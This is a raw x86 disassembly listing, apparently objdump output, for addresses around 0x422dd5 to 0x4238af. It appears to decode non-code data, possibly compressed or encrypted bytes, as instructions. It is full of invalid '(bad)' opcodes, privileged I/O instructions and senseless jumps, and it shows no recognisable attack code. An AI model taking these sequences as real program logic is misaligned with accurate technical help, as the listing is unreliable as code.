  422dd5:	add    BYTE PTR [edi+0x626d60bd],bh
  422ddb:	std    
  422ddc:	mov    edi,0x80797fff
  422de1:	sub    ecx,esp
  422de3:	fistp  WORD PTR [eax+ebx*4+0x67]
  422de7:	jbe    0x422dea
  422de9:	add    BYTE PTR [eax],al
  422deb:	add    DWORD PTR [eax],eax
  422ded:	add    BYTE PTR [edi],ch
  422def:	inc    ebx
  422df0:	xchg   esi,eax
  422df1:	xchg   edi,eax
  422df2:	sbb    al,0xeb
  422df4:	idiv   DWORD PTR [ebx+0x57049d84]
  422dfa:	mov    bl,0x60
  422dfc:	jnp    0x422e17
  422dfe:	mov    ebp,0xb8387ea
  422e03:	test   BYTE PTR [edx-0x7c24d229],ch
  422e09:	sub    al,0xeb
  422e0b:	(bad)  
  422e0c:	push   cs
  422e0d:	fild   QWORD PTR [esi+0x24bbb1f7]
  422e13:	push   edx
  422e14:	data16 out 0x58,al
  422e17:	hlt    
  422e18:	adc    ebx,ebp
  422e1a:	sahf   
  422e1b:	and    eax,0x4657b511
  422e20:	mov    ecx,0x41415fb5
  422e25:	jb     0x422e37
  422e27:	inc    ebx
  422e28:	cs sti 
  422e2a:	cwde   
  422e2b:	mov    esp,DWORD PTR [esi-0xf]
  422e2e:	sub    al,0x99
  422e30:	shr    ah,cl
  422e32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e33:	pop    ebp
  422e34:	fadd   DWORD PTR ds:0x90384d1c
  422e3a:	jle    0x422e79
  422e3c:	cmp    esp,esp
  422e3e:	push   cs
  422e3f:	lods   al,BYTE PTR gs:[esi]
  422e41:	push   ebp
  422e42:	or     DWORD PTR [ebp+0x62],edx
  422e45:	mov    ecx,DWORD PTR [eax-0x5169b085]
  422e4b:	loopne 0x422e82
  422e4d:	test   DWORD PTR [edx+0x51],0xc05ab92
  422e54:	test   ch,dh
  422e56:	sbb    al,0xe5
  422e58:	push   esi
  422e59:	inc    ebx
  422e5a:	mov    al,BYTE PTR [ebp+0x6ca44d2a]
  422e60:	mov    eax,ds:0xb62eaf22
  422e65:	sti    
  422e66:	out    dx,al
  422e67:	shl    DWORD PTR [eax+edi*2],1
  422e6a:	and    eax,0x3f5aeec5
  422e6f:	scas   eax,DWORD PTR es:[edi]
  422e70:	or     DWORD PTR [ebx],edi
  422e72:	mov    esi,eax
  422e74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e75:	mov    esp,0x9d6de925
  422e7a:	ja     0x422ed5
  422e7c:	adc    eax,0x8a218bc3
  422e81:	pushf  
  422e82:	ins    DWORD PTR es:[edi],dx
  422e83:	inc    edi
  422e84:	or     al,0xcf
  422e86:	adc    esi,DWORD PTR [ebx+0x32ed265e]
  422e8c:	mov    al,ds:0x158da038
  422e91:	pop    esi
  422e92:	inc    esi
  422e93:	shr    ebx,1
  422e95:	jbe    0x422e67
  422e97:	and    DWORD PTR [edx-0x7c873bfa],0x9b983045
  422ea1:	push   ds
  422ea2:	jno    0x422e8a
  422ea4:	fmul   DWORD PTR ds:0xe1980952
  422eaa:	jg     0x422f14
  422eac:	rol    bl,1
  422eae:	jmp    0xf973:0x1442b68e
  422eb5:	repnz idiv BYTE PTR es:[eax-0x57a0767f]
  422ebd:	jmp    0x65b0:0x5dcd8a8f
  422ec4:	mov    esp,0x56a0b6d7
  422ec9:	xchg   edi,eax
  422eca:	aam    0x93
  422ecc:	ror    BYTE PTR [ebx-0xdf83dc0],1
  422ed2:	inc    edx
  422ed3:	or     BYTE PTR [esi],dh
  422ed5:	dec    esi
  422ed6:	scas   eax,DWORD PTR es:[edi]
  422ed7:	sbb    DWORD PTR [ecx+0x2727f2c7],esi
  422edd:	test   ebx,esp
  422edf:	adc    BYTE PTR [ebp-0x420982fb],bl
  422ee5:	out    dx,eax
  422ee6:	cmp    al,0xa2
  422ee8:	cld    
  422ee9:	sbb    esp,DWORD PTR [esi+0x38812e]
	...
  422f53:	add    BYTE PTR [eax],al
  422f55:	add    BYTE PTR [ebx-0x21e677ab],al
  422f5b:	fst    QWORD PTR [ebx+0x33b808df]
  422f61:	retf   0xb630
  422f64:	mov    dh,0xe5
  422f66:	addr16 ja 0x422f6a
  422f69:	add    BYTE PTR [eax],al
  422f6b:	add    DWORD PTR [eax],eax
  422f6d:	add    BYTE PTR [eax-0x78],bl
  422f70:	mov    al,0x66
  422f72:	push   esi
  422f73:	fbld   TBYTE PTR [ebx]
  422f75:	retf   
  422f76:	hlt    
  422f77:	out    0xde,eax
  422f79:	in     eax,dx
  422f7a:	nop
  422f7b:	shl    BYTE PTR [ecx+0x68],cl
  422f7e:	xor    DWORD PTR [edi+0x4b4f925],ecx
  422f84:	lock mov esi,0x174174eb
  422f8a:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  422f8c:	or     BYTE PTR [ecx],bl
  422f8e:	or     eax,0xa53941f9
  422f93:	lods   eax,DWORD PTR ds:[esi]
  422f94:	mov    al,0x8a
  422f96:	fistp  QWORD PTR [esi+0x787cfc33]
  422f9c:	in     al,0x65
  422f9e:	cmovno ebp,DWORD PTR [eax+0x6f3aff21]
  422fa5:	sti    
  422fa6:	adc    BYTE PTR [eax],ah
  422fa8:	jae    0x422f97
  422faa:	loope  0x422f4e
  422fac:	pop    ebx
  422fad:	das    
  422fae:	and    dl,BYTE PTR [esi+0x4b]
  422fb1:	xchg   esp,eax
  422fb2:	jmp    DWORD PTR [esi+eax*2+0x2b85f659]
  422fb9:	adc    BYTE PTR [ebp+0x1030ff80],al
  422fbf:	repz sub BYTE PTR [ebx+0x2febe1d5],dh
  422fc6:	and    DWORD PTR [ebp-0x71],ebx
  422fc9:	ffree  st(7)
  422fcb:	adc    al,al
  422fcd:	scas   al,BYTE PTR es:[edi]
  422fce:	jne    0x423006
  422fd0:	push   es
  422fd1:	dec    esp
  422fd2:	es pop esp
  422fd4:	out    0x62,eax
  422fd6:	vmread DWORD PTR [ebx],eax
  422fd9:	in     al,0xee
  422fdb:	outs   dx,DWORD PTR ds:[esi]
  422fdc:	add    esp,DWORD PTR [ecx+0x2]
  422fdf:	fwait
  422fe0:	pop    ebp
  422fe1:	fst    QWORD PTR [esi+eiz*8]
  422fe4:	push   0xb659d0fa
  422fe9:	data16 add dl,al
  422fec:	and    dh,dh
  422fee:	sbb    al,bl
  422ff0:	rcr    DWORD PTR [ebx-0xfec62ae],0x2e
  422ff7:	push   ebp
  422ff8:	inc    ecx
  422ff9:	push   eax
  422ffa:	jb     0x422ff0
  422ffc:	aaa    
  422ffd:	xchg   ah,ch
  422fff:	cmp    ebp,esi
  423001:	adc    DWORD PTR [eax-0x3123ca14],0x4a3ffcc9
  42300b:	sub    bh,al
  42300d:	pop    ds
  42300e:	(bad)  
  42300f:	fwait
  423010:	mov    ecx,0xa0c2cc2a
  423015:	mov    esi,0x917a9258
  42301a:	(bad)  
  42301b:	sahf   
  42301c:	or     dl,BYTE PTR [ebx+eiz*1-0x27]
  423020:	cmc    
  423021:	fidivr DWORD PTR [ebx-0x52ea940f]
  423027:	add    BYTE PTR [edi+0x34],ch
  42302a:	inc    ecx
  42302b:	sbb    BYTE PTR [ecx-0x28],dh
  42302e:	inc    edi
  42302f:	push   ss
  423030:	shl    DWORD PTR [eax],cl
  423032:	ins    BYTE PTR es:[edi],dx
  423033:	or     ah,BYTE PTR [edx-0xd3649f6]
  423039:	imul   eax,DWORD PTR [eax-0x768d8283],0xffffffbd
  423040:	ss pop ecx
  423042:	lods   eax,DWORD PTR ds:[esi]
  423043:	and    BYTE PTR [edi+0xd],dl
  423046:	mov    bh,0xfe
  423048:	mov    ds:0xef02e806,eax
  42304d:	in     eax,0x6e
  42304f:	cdq    
  423050:	cmp    edi,ebp
  423052:	enter  0xe364,0x6a
  423056:	popa   
  423057:	mov    bl,0x91
  423059:	stc    
  42305a:	les    esp,FWORD PTR [edi]
  42305c:	popf   
  42305d:	js     0x423099
  42305f:	sub    eax,0x1d82db18
  423064:	pop    esp
  423065:	sub    eax,0x9ef52ba5
  42306a:	cmc    
  42306b:	pop    edi
  42306c:	and    DWORD PTR [edx],ebp
	...
  4230d6:	inc    esi
  4230d7:	in     al,0x62
  4230d9:	mov    dl,ah
  4230db:	mov    gs,esi
  4230dd:	out    dx,al
  4230de:	sub    ecx,ebx
  4230e0:	sbb    DWORD PTR [eax+ebx*8+0x675f3ad0],esp
  4230e7:	js     0x4230ea
  4230e9:	add    BYTE PTR [eax],al
  4230eb:	add    DWORD PTR [eax],eax
  4230ed:	add    BYTE PTR [eax],dh
  4230ef:	jnp    0x423156
  4230f1:	lea    edi,[edi+eiz*8+0x721ac865]
  4230f8:	pusha  
  4230f9:	pop    ecx
  4230fa:	clc    
  4230fb:	inc    esp
  4230fc:	arpl   WORD PTR [ecx],di
  4230fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230ff:	fdiv   DWORD PTR [eax+0x9]
  423102:	aam    0xf1
  423104:	jo     0x423168
  423106:	cmp    eax,0xe2cee641
  42310b:	aas    
  42310c:	dec    ecx
  42310d:	add    eax,0x429f9325
  423112:	mov    edx,0x934b9ddb
  423117:	cmp    ecx,DWORD PTR [ebx*4+0x26359e21]
  42311e:	mov    dl,0xf9
  423120:	arpl   WORD PTR [ecx+0x9315644],sp
  423126:	mov    esi,0x3d5e0b8b
  42312b:	lahf   
  42312c:	in     al,dx
  42312d:	shl    DWORD PTR [edx-0x76f14e06],1
  423133:	(bad)  
  423134:	out    dx,al
  423135:	jno    0x4230b8
  423137:	clc    
  423138:	inc    edx
  423139:	mov    ds:0x471f78f0,eax
  42313e:	add    DWORD PTR [edx+0x6e],eax
  423141:	in     eax,0xe2
  423143:	call   DWORD PTR [ecx+0x73]
  423146:	pop    edi
  423147:	fdivr  DWORD PTR [ebp+0x4db82779]
  42314d:	push   esi
  42314e:	sbb    al,cl
  423150:	xor    DWORD PTR [eax+0x1d],edi
  423153:	sub    eax,0xe7c4d462
  423158:	jl     0x423171
  42315a:	sbb    BYTE PTR [edi+0x6aee3ed8],bh
  423160:	xchg   edx,eax
  423161:	or     eax,0x44bb9f8f
  423166:	or     al,0xa7
  423168:	or     eax,0x50471303
  42316d:	or     al,0x62
  42316f:	(bad)  
  423170:	sub    eax,0x55de4c1e
  423175:	dec    edx
  423176:	arpl   WORD PTR [esp+ecx*1],cx
  423179:	pop    edx
  42317a:	add    DWORD PTR [ebx-0x720b07e7],esp
  423180:	push   ds
  423181:	xchg   ebx,eax
  423182:	jp     0x423175
  423184:	lds    esi,FWORD PTR [edx-0x74]
  423187:	sub    DWORD PTR [esi],esp
  423189:	sub    edi,DWORD PTR [edi]
  42318b:	or     al,0xf3
  42318d:	loope  0x4231cc
  42318f:	xor    edx,DWORD PTR [esi]
  423191:	into   
  423192:	fidiv  WORD PTR [edi]
  423194:	sbb    ecx,DWORD PTR [ecx-0x5e]
  423197:	repz mov eax,ds:0xa5eb6e23
  42319d:	mov    ah,0x3b
  42319f:	add    esp,0xffffffea
  4231a2:	ja     0x4231aa
  4231a4:	push   ebp
  4231a5:	push   esi
  4231a6:	dec    eax
  4231a7:	xor    esi,DWORD PTR [edx-0x19d48911]
  4231ad:	push   0xbfa6776d
  4231b2:	push   ebp
  4231b3:	imul   eax,DWORD PTR [eax],0xffffffea
  4231b6:	les    esp,FWORD PTR [eax]
  4231b8:	inc    esp
  4231b9:	loopne 0x4231fa
  4231bb:	push   0x2893ba14
  4231c0:	xchg   edi,eax
  4231c1:	(bad)  
  4231c2:	fisubr DWORD PTR [ebp+0x69]
  4231c5:	std    
  4231c6:	data16 test BYTE PTR es:[ebx],dl
  4231ca:	xchg   edi,eax
  4231cb:	dec    ecx
  4231cc:	xor    DWORD PTR [ecx+eiz*4+0x1a],edi
  4231d0:	sub    al,0x58
  4231d2:	pop    ebx
  4231d3:	scas   eax,DWORD PTR es:[edi]
  4231d4:	xchg   edx,eax
  4231d5:	lock mov eax,ds:0x280cb7f6
  4231db:	jl     0x423209
  4231dd:	or     BYTE PTR [esi-0x69f4e32b],dl
  4231e3:	fstp   TBYTE PTR [edx+eiz*1+0x56283fee]
  4231ea:	jge    0x4231a8
  4231ec:	inc    ecx
  4231ed:	mov    eax,DWORD PTR [eax]
	...
  423253:	add    BYTE PTR [eax],al
  423255:	add    BYTE PTR [ecx-0xf],bh
  423258:	div    DWORD PTR [ecx-0x6804801]
  42325e:	in     al,0xe0
  423260:	sub    DWORD PTR [edx-0x5b46f414],esp
  423266:	addr16 jns 0x42326a
  423269:	add    BYTE PTR [eax],al
  42326b:	add    DWORD PTR [eax],eax
  42326d:	add    al,al
  42326f:	ss ja  0x4232be
  423272:	or     al,0x86
  423274:	inc    edx
  423275:	cs mov cl,0x67
  423278:	fwait
  423279:	pop    edx
  42327a:	retf   
  42327b:	ja     0x423267
  42327d:	test   esi,ebx
  42327f:	cmc    
  423280:	loopne 0x4232f3
  423282:	frstor [ecx-0x79bd5731]
  423288:	pop    edx
  423289:	ds add ch,ch
  42328c:	out    0xe,al
  42328e:	jmp    0x4232b7
  423290:	mov    ds:0xc286c86d,al
  423295:	jmp    0x708073fd
  42329a:	les    ecx,FWORD PTR gs:[edi+0x35]
  42329e:	lods   al,BYTE PTR ds:[esi]
  42329f:	mov    ebp,0x2c6a8ff0
  4232a4:	xor    eax,0x96d07d5e
  4232a9:	sub    BYTE PTR [ebp+ebx*1+0x63c739e6],ch
  4232b0:	push   ebp
  4232b1:	bound  ax,DWORD PTR [edx+0x6c3fc35b]
  4232b8:	sub    eax,0xebbb0d13
  4232bd:	inc    ebx
  4232be:	mov    bl,0xdc
  4232c0:	xlat   BYTE PTR ds:[ebx]
  4232c1:	xchg   esp,eax
  4232c2:	ins    BYTE PTR es:[edi],dx
  4232c3:	(bad)
  4232c6:	sub    eax,0x68f2e5e2
  4232cb:	ret    0xa20d
  4232ce:	mov    eax,gs:0xcd1b9abf
  4232d4:	adc    BYTE PTR [edi+0x75eb332c],0x2
  4232db:	gs js  0x423290
  4232de:	push   edx
  4232df:	xchg   edx,eax
  4232e0:	scas   al,BYTE PTR es:[edi]
  4232e1:	jo     0x423291
  4232e3:	in     al,0x39
  4232e5:	pop    ds
  4232e6:	and    eax,0xc3ebd6bf
  4232eb:	pop    ecx
  4232ec:	repnz sbb ah,al
  4232ef:	jmp    0x6ded65e4
  4232f4:	mov    ah,0x9e
  4232f6:	fidiv  WORD PTR [esp+edx*4-0x5f]
  4232fa:	push   ds
  4232fb:	data16 repnz adc ah,BYTE PTR [ebp-0x26]
  423300:	idiv   DWORD PTR [ebx]
  423302:	mov    bl,0xf9
  423304:	mov    esp,0x4b592c82
  423309:	sbb    DWORD PTR [ecx*2-0xb918f5d],ebp
  423310:	mov    eax,0xf5170243
  423315:	pop    ecx
  423316:	pop    eax
  423317:	out    dx,eax
  423318:	mov    dl,BYTE PTR [edi-0x35]
  42331b:	xchg   ebx,eax
  42331c:	outs   dx,BYTE PTR ds:[esi]
  42331d:	add    eax,0x177c5c94
  423322:	pop    ss
  423323:	(bad)  
  423324:	pcmpeqd mm6,QWORD PTR [ebp+0x2f]
  423328:	js     0x4232d7
  42332a:	(bad)  
  42332b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42332c:	gs cmp al,0xd7
  42332f:	dec    esi
  423330:	out    dx,al
  423331:	sub    cl,ch
  423333:	jmp    0x91d2:0x601bd707
  42333a:	xor    BYTE PTR [ebp+0x67],ch
  42333d:	pop    ecx
  42333e:	(bad)  
  42333f:	cdq    
  423340:	ret    0xaeca
  423343:	jp     0x42332f
  423345:	add    esp,esi
  423347:	push   edx
  423348:	mov    al,dh
  42334a:	stc    
  42334b:	adc    DWORD PTR [ebx-0x2616d604],edi
  423351:	fldcw  WORD PTR [ecx+edx*1-0x7da9fa81]
  423358:	fwait
  423359:	jmp    0xca22e68d
  42335e:	js     0x42335e
  423360:	(bad)  
  423362:	adc    ebx,DWORD PTR [edi+0x43]
  423365:	jecxz  0x42331b
  423367:	xlat   BYTE PTR ds:[ebx]
  423368:	call   0x13:0xe0e08834
	...
  4233d3:	add    BYTE PTR [eax],al
  4233d5:	add    al,bh
  4233d7:	fisub  WORD PTR [edx+0x30]
  4233da:	mov    sp,0xdefa
  4233de:	mov    eax,fs:0x613f0f44
  4233e4:	pop    esp
  4233e5:	(bad)  
  4233e6:	addr16 jp 0x4233ea
  4233e9:	add    BYTE PTR [eax],al
  4233eb:	add    DWORD PTR [eax],eax
  4233ed:	add    BYTE PTR [eax],al
  4233ef:	mov    es,WORD PTR [ebx-0x7]
  4233f2:	(bad)  
  4233f3:	sbb    dh,BYTE PTR [edi]
  4233f5:	and    al,0xdf
  4233f7:	xchg   esp,eax
  4233f8:	fnstenv [edi+edi*8]
  4233fb:	mov    edx,0x54c018e1
  423400:	xor    ah,BYTE PTR [ebx+ecx*1-0x82d1711]
  423407:	push   ecx
  423408:	mov    dl,0x8c
  42340a:	cmp    bl,0x58
  42340d:	repz call 0xa841:0x1ee3a8b8
  423415:	add    al,0xcc
  423417:	xchg   esi,eax
  423418:	daa    
  423419:	fwait
  42341a:	dec    ecx
  42341b:	lahf   
  42341c:	out    dx,al
  42341d:	shl    DWORD PTR [esi-0x957627b],0x3c
  423424:	sbb    al,al
  423426:	mov    eax,ds:0x230474a7
  42342b:	not    DWORD PTR [esi]
  42342d:	mov    dl,0x72
  42342f:	push   es
  423430:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423431:	cmp    eax,0x7295abd4
  423436:	ja     0x423443
  423438:	mov    ebp,0xaf903239
  42343d:	jo     0x42348d
  42343f:	das    
  423440:	out    dx,eax
  423441:	inc    esi
  423442:	cmc    
  423443:	push   cs
  423444:	add    esi,edi
  423446:	cmp    eax,0xe035ab4c
  42344b:	xchg   esi,eax
  42344c:	mov    dh,0xc
  42344e:	fld    DWORD PTR [eax-0x4c6c3bb9]
  423454:	cdq    
  423455:	sub    al,0x75
  423457:	inc    ax
  423459:	push   ss
  42345a:	lods   al,BYTE PTR ds:[esi]
  42345b:	or     DWORD PTR [eax],0x43e8aafb
  423461:	fst    QWORD PTR [edx+0x51a9f014]
  423467:	add    ebp,ebx
  423469:	cmc    
  42346a:	outs   dx,DWORD PTR ds:[esi]
  42346b:	enter  0x4355,0x88
  42346f:	repnz imul eax,edx,0x7a21a5e2
  423476:	sbb    BYTE PTR [edx-0x1c136206],0xec
  42347d:	mov    eax,0xc5a4907f
  423482:	jbe    0x4234e6
  423484:	jg     0x42340d
  423486:	pop    ss
  423487:	or     BYTE PTR [ecx-0x67019441],al
  42348d:	ficomp WORD PTR [edi+0x7d]
  423490:	xor    al,0x59
  423492:	jp     0x4234a4
  423494:	into   
  423495:	mov    WORD PTR [edi],ss
  423497:	and    ah,BYTE PTR [edi]
  423499:	add    DWORD PTR [edx],ecx
  42349b:	push   ss
  42349c:	jnp    0x4234b1
  42349e:	fwait
  42349f:	sbb    al,BYTE PTR [ecx-0x490a538f]
  4234a5:	das    
  4234a6:	jmp    0x423477
  4234a8:	sbb    eax,0xa0fc9a27
  4234ad:	and    DWORD PTR [edi-0x57262b15],ecx
  4234b3:	ss iret 
  4234b5:	push   ebx
  4234b6:	lods   eax,DWORD PTR ds:[esi]
  4234b7:	xchg   BYTE PTR [ebp-0x129e6056],bh
  4234bd:	inc    ebp
  4234be:	ja     0x42347c
  4234c0:	test   BYTE PTR [ecx-0x76],ah
  4234c3:	inc    esp
  4234c4:	js     0x423539
  4234c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234c7:	loop   0x4234ae
  4234c9:	xchg   DWORD PTR [ecx],ecx
  4234cb:	jne    0x4234e7
  4234cd:	sbb    al,0xd1
  4234cf:	cmp    BYTE PTR [eax-0x46000251],0xe1
  4234d6:	inc    esp
  4234d7:	mov    ch,0xe1
  4234d9:	aas    
  4234da:	pop    esi
  4234db:	out    dx,eax
  4234dc:	inc    ecx
  4234dd:	cmc    
  4234de:	daa    
  4234df:	mov    al,BYTE PTR [ecx+0x3c]
  4234e2:	sub    eax,0x24f6550e
  4234e7:	repz mov esi,0xc960566a
  4234ed:	xlat   BYTE PTR ds:[ebx]
	...
  423556:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42355d:	mov    edi,0x1fadf467
  423562:	fisttp DWORD PTR ds:0x7b679dc8
  423568:	add    DWORD PTR [eax],eax
  42356a:	add    BYTE PTR [ecx],al
  42356c:	add    BYTE PTR [eax],al
  42356e:	cmp    al,0xf9
  423570:	(bad)  
  423571:	(bad)  [eax]
  423573:	pop    es
  423574:	cdq    
  423575:	in     eax,0x2c
  423577:	jno    0x42356d
  423579:	inc    ecx
  42357a:	fsubr  QWORD PTR [edi+0xd]
  42357d:	pop    esp
  42357e:	pop    ds
  42357f:	repz out 0xb2,al
  423582:	int3   
  423583:	sub    esp,esp
  423585:	(bad)  
  423586:	repnz sbb bl,BYTE PTR [eax+0x11]
  42358a:	loopne 0x423537
  42358c:	outs   dx,DWORD PTR ds:[esi]
  42358d:	lds    eax,FWORD PTR [ebx+0xc]
  423590:	push   es
  423591:	(bad)  
  423592:	jp     0x4235b3
  423594:	and    ch,BYTE PTR [ebx+ecx*4+0x1]
  423598:	in     eax,0x29
  42359a:	(bad)  
  42359c:	cmc    
  42359d:	aaa    
  42359e:	or     DWORD PTR es:[eax+esi*4+0x58],eax
  4235a3:	inc    esi
  4235a4:	je     0x42356c
  4235a6:	inc    ebp
  4235a7:	ins    BYTE PTR es:[edi],dx
  4235a8:	arpl   WORD PTR [ebp+esi*1-0x6eecb918],ax
  4235af:	add    BYTE PTR [eax+edi*4-0x72],0x2a
  4235b4:	in     eax,dx
  4235b5:	das    
  4235b6:	aaa    
  4235b7:	jns    0x4235e7
  4235b9:	jge    0x4235bd
  4235bb:	retf   
  4235bc:	push   ebp
  4235bd:	push   ebp
  4235be:	and    eax,0xe2f81c04
  4235c3:	(bad)  
  4235c4:	pop    ecx
  4235c5:	push   0x8ba7745e
  4235ca:	xchg   edx,eax
  4235cb:	and    esi,DWORD PTR [edx-0x71]
  4235ce:	neg    DWORD PTR [esi-0x750526ba]
  4235d4:	adc    BYTE PTR [edx+edx*4+0x6054de89],dl
  4235db:	mov    al,0x84
  4235dd:	addr16 jmp 0xfe4b31e2
  4235e3:	adc    DWORD PTR [ebp+0x43],0x7c771a65
  4235ea:	xor    esi,eax
  4235ec:	xchg   DWORD PTR [edx*2-0x2d7def64],edx
  4235f3:	gs inc esp
  4235f5:	sahf   
  4235f6:	cdq    
  4235f7:	(bad)  
  4235f8:	lods   al,BYTE PTR ds:[esi]
  4235f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235fa:	loop   0x42363b
  4235fc:	sbb    DWORD PTR [edx-0x2ab1e95],ebp
  423602:	dec    eax
  423603:	shl    BYTE PTR [edx+ecx*1-0x1f4e11b],0x51
  42360b:	neg    BYTE PTR [eax+esi*8]
  42360e:	mov    dl,0x9e
  423610:	xchg   edx,eax
  423611:	push   ecx
  423612:	les    eax,FWORD PTR [edi-0x7a]
  423615:	pushf  
  423616:	xor    dl,BYTE PTR [esi-0x41]
  423619:	das    
  42361a:	jb     0x42359f
  42361c:	out    dx,eax
  42361d:	pusha  
  42361e:	daa    
  42361f:	loop   0x4235b9
  423621:	fist   DWORD PTR [eax-0x36733d42]
  423627:	imul   DWORD PTR [ebp-0x7381be51]
  42362d:	push   ebx
  42362e:	daa    
  42362f:	adc    eax,0x9e7daecf
  423634:	sub    edx,edi
  423636:	adc    ch,al
  423638:	jle    0x4235be
  42363a:	fincstp 
  42363c:	push   ds
  42363d:	push   ecx
  42363e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42363f:	test   al,0xc6
  423641:	dec    ecx
  423642:	sbb    edi,esp
  423644:	and    al,0x4d
  423646:	xor    dh,BYTE PTR [edi+0x5a]
  423649:	inc    edi
  42364a:	dec    ebp
  42364b:	mov    ch,0x5c
  42364d:	pop    esi
  42364e:	inc    esp
  42364f:	dec    ebp
  423650:	mov    ebp,0xe6f0a56b
  423655:	and    edi,DWORD PTR [esi+0x18]
  423658:	popa   
  423659:	pop    ecx
  42365a:	mov    ch,0x26
  42365c:	fidiv  DWORD PTR [edi-0x56]
  42365f:	inc    edx
  423660:	mov    dh,0x9d
  423662:	jp     0x4236ad
  423664:	pop    eax
  423665:	call   0x2ee54209
  42366a:	push   ds
  42366b:	out    dx,eax
  42366c:	in     eax,0x4e
	...
  4236d6:	or     BYTE PTR [edi-0x8808b84],0x88
  4236dd:	jmp    FWORD PTR [esi-0x6f]
  4236e0:	jl     0x4236f5
  4236e2:	shr    edi,cl
  4236e4:	dec    edi
  4236e5:	mov    ah,0x67
  4236e7:	jl     0x4236ea
  4236e9:	add    BYTE PTR [eax],al
  4236eb:	add    DWORD PTR [eax],eax
  4236ed:	add    al,ch
  4236ef:	iret   
  4236f0:	arpl   WORD PTR [edx-0x3],bx
  4236f3:	inc    eax
  4236f4:	js     0x4236af
  4236f6:	pop    ecx
  4236f7:	adc    cl,BYTE PTR [esi+0x2e]
  4236fa:	gs add al,0xd4
  4236fd:	fisubr DWORD PTR [eax+0x7a1cf917]
  423703:	xor    ah,dl
  423705:	xchg   esp,eax
  423706:	pop    ecx
  423707:	inc    ecx
  423708:	sbb    esi,DWORD PTR [eax-0x74]
  42370b:	jl     0x4236d3
  42370d:	aam    0x85
  42370f:	imul   edx,DWORD PTR [eax],0x2757e0a8
  423715:	jp     0x42377f
  423717:	pop    eax
  423718:	cmc    
  423719:	stc    
  42371a:	fimul  WORD PTR [ecx+0x132f9916]
  423720:	lods   eax,DWORD PTR ds:[esi]
  423721:	(bad)  
  423722:	aaa    
  423723:	mov    ah,0x94
  423725:	fld    QWORD PTR [eax]
  423727:	imul   esp,ebx,0x77e3fcb7
  42372d:	or     BYTE PTR [eax+ebp*8-0x31],ah
  423731:	int3   
  423732:	nop
  423733:	sbb    DWORD PTR [esi-0x733dc2c1],ecx
  423739:	hlt    
  42373a:	mov    cl,0x8c
  42373c:	xor    DWORD PTR [edi],esi
  42373e:	scas   al,BYTE PTR es:[edi]
  42373f:	cmp    DWORD PTR [ecx+eax*2],edi
  423742:	shl    ecx,0xe7
  423745:	test   DWORD PTR [ebp+edi*8+0x6a5be142],edi
  42374c:	test   eax,0x177152b7
  423751:	or     dl,ch
  423753:	and    eax,0x5eb92101
  423758:	or     BYTE PTR [eax+ebx*1],0xe5
  42375c:	sub    eax,0x7dc573d7
  423761:	aas    
  423762:	mov    eax,ds:0xd192b30a
  423767:	(bad)  
  423768:	jae    0x423735
  42376a:	add    ch,bh
  42376c:	jle    0x4236ef
  42376e:	and    BYTE PTR gs:[edx-0x5c],0x15
  423773:	sbb    al,0x12
  423775:	ins    BYTE PTR es:[edi],dx
  423776:	outs   dx,DWORD PTR ds:[esi]
  423777:	daa    
  423778:	mov    WORD PTR [ebp+0x5e],fs
  42377b:	sub    al,0x31
  42377e:	pop    esi
  42377f:	adc    BYTE PTR [ebx+0x205874],al
  423785:	and    esi,DWORD PTR [esi+0x12]
  423788:	cmp    BYTE PTR [edx-0x461e907c],0xf
  42378f:	add    DWORD PTR es:[ebp+edx*2+0x7c7647cf],esp
  423797:	jae    0x42375d
  423799:	jmp    0x4237ad
  42379b:	jo     0x423730
  42379d:	and    eax,0x8e115851
  4237a2:	sub    cl,dl
  4237a4:	sahf   
  4237a5:	repz jmp 0x69c9:0x67602e12
  4237ad:	je     0x4237f3
  4237af:	xor    ecx,DWORD PTR [ebp-0x6f169ac8]
  4237b5:	popf   
  4237b6:	retf   0x1a2d
  4237b9:	push   ecx
  4237ba:	xchg   edi,eax
  4237bb:	(bad)  [eax-0x6dfe1728]
  4237c1:	addr16 sahf 
  4237c3:	jmp    0xcfa9:0x46613ae7
  4237ca:	and    DWORD PTR [eax+eiz*1-0xf6f2665],0xd
  4237d2:	ret    0xfc13
  4237d5:	sbb    eax,0x8ba23dd
  4237da:	aaa    
  4237db:	outs   dx,DWORD PTR ds:[esi]
  4237dc:	fstp   st(7)
  4237de:	xchg   edi,eax
  4237df:	mov    cl,BYTE PTR [ecx-0x76]
  4237e2:	cli    
  4237e3:	rcr    edi,cl
  4237e5:	in     al,0x80
  4237e7:	out    0x50,al
  4237e9:	(bad)  
  4237eb:	xlat   BYTE PTR ds:[ebx]
  4237ec:	jle    0x4237bf
	...
  423856:	xor    al,0x23
  423858:	jo     0x4237f7
  42385a:	ja     0x42383b
  42385c:	std    
  42385d:	stos   DWORD PTR es:[edi],eax
  42385e:	(bad)  
  42385f:	sbb    edx,esi
  423861:	jmp    0x7d67:0x70c44b6a
  423868:	add    DWORD PTR [eax],eax
  42386a:	add    BYTE PTR [ecx],al
  42386c:	add    BYTE PTR [eax],al
  42386e:	cmc    
  42386f:	shl    BYTE PTR [ecx],0x4
  423872:	hlt    
  423873:	mov    al,0x58
  423875:	fwait
  423876:	gs push ebx
  423878:	pop    ebx
  423879:	xor    al,0x1b
  42387b:	enter  0xd680,0x59
  42387f:	mov    ah,0x6f
  423881:	mov    edi,0x4227d4ff
  423886:	mov    edi,0x9fc625cb
  42388b:	dec    ebp
  42388c:	adc    esp,DWORD PTR [ebx+0x3908f01b]
  423892:	cmp    DWORD PTR [esi+ebp*2-0x602e094d],ebx
  423899:	or     DWORD PTR [edx+0x2604126],esi
  42389f:	mov    cl,0x9
  4238a1:	in     eax,0x2
  4238a3:	fstp   TBYTE PTR [eax-0x378d42bc]
  4238a9:	xor    dh,al
  4238ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238ad:	div    DWORD PTR [edx]
  4238af:	sbb    al,0xd0
